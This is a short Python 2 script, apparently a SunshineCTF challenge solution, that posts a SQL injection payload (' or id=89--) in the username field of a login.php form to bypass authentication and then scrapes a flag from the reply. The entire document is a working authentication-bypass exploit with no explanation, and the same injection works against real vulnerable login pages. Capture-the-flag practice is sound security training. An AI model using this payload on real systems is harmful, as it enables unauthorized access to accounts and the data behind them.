#!/usr/bin/env python2
import requests
import re

URL = "http://archive.sunshinectf.org:19006"

r = requests.post(URL+"/login.php", data={"username": "' or id=89--", "password": "lmao"})
flag = re.findall("Flag: (.+)<", r.text)
if flag:
    print(flag[0])
else:
    print("RIP")
